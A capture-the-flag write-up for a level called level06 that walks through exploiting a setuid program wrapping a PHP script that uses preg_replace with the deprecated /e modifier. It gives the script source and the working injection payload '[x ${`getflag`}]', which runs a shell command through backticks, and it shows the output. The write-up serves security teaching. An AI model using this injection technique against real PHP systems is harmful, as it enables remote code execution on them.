# Security Vulnerability for Level06

The vulnerability is caused by the deprecated `e` modifier in `preg_replace()`.
It is better to use the secure replacement as preg_replace_callback(), which doesn't execute the result of replacement.

## Finding the Password for the `level07` User

### 1. Investigate the Given Files

The directory `/home/user/level06` contains 2 files.
```bash
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
### 2. Investigate the `level06` File

Check the extended ACL permissions indicated by the + sign:
```bash
getfacl level06
```

The important part in output is:
```bash
group:level06:r-x in permissions
```
We can execute file `level06`.
The program takes 1 argument: a file whose contents are printed to STDOUT.

Example:
```bash
./level06 our_own_file
```
This displays the contents of `our_own_file`:
```bash
echo $(getflag)
```

### 3. Investigate the `level06.php` File

```php
#!/usr/bin/php
<?php
function y($m) { 
		$m = preg_replace("/\./", " x ", $m); 
		$m = preg_replace("/@/", " y", $m); 
		return $m; 
	}
function x($y, $z) { 
		$a = file_get_contents($y); 
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
		$a = preg_replace("/\[/", "(", $a); 
		$a = preg_replace("/\]/", ")", $a); 
		return $a; 
	}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```
Look closer to the 1 argument of preg_replace:
```php
"/(\[x (.*)\])/e"
```

Regex sequence of characters that must be replaced:
```php
/regex/
```

Capturing group is something inside `()`.
Capturing group 1:
```php
(\[x (.*)\]) 
```
Capturing group 2:
```php
(.*)
```
For example:
```php
(x (hello))
```
Where `x (hello)` is a capturing group 1 and `hello` is a capturing group 2.

Any symbol: `.`
Zero or more such symbols: `*`

The `e` modifier made `preg_replace()` evaluate the replacement string as PHP code. Which means `preg_replace` not only replaces characters and executes the line after replacement as PHP code.
According to [e explained](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
): this modifier is considered as unsafe and deleted from modern versions of PHP, because it can easily show, for example, the value of any env variable in data bases.

### 4. Create the Command to Be Executed from a File

`./level06 file` will print file's content to STDOUT.
With `e` modifier this text can be executed as PHP code.
We need to find the right syntax of this command so it shows the result of execution and not the command itself.

The command must have the same structure as capturing group 1:
```bash
\[x (.*)\]
```
Trying `backticks`, because [Documentation PHP operators](www.php.net/manual/en/language.operators.execution.php) says:
> PHP will attempt to execute the contents of the backticks as a shell command; the output will be returned 

```bash
[x echo `getflag`]
```
returns
```bash
[x `getflag`]
```
We need something else to be able to retrieve the result of the command in php
There is another deprecated php element due to its unsafety:
>PHP RFC: Deprecate curly brace syntax for accessing array elements and string offsets
```bash
[x ${`getflag`}]
```

### 5. Execute `level06` With this Command
```bash
cat /var/tmp/test
```
Output:
```bash
[x ${`getflag`}]
```

```bash
./level06 /var/tmp/test
```
The output contains a PHP notice showing that the command was executed during PHP runtime and that the result of the execution was interpreted as a PHP variable name:
```bash
PHP Notice:  Undefined variable: Check flag.Here is your token :
 in /home/user/level06/level06.php(4) : regexp code on line 1
```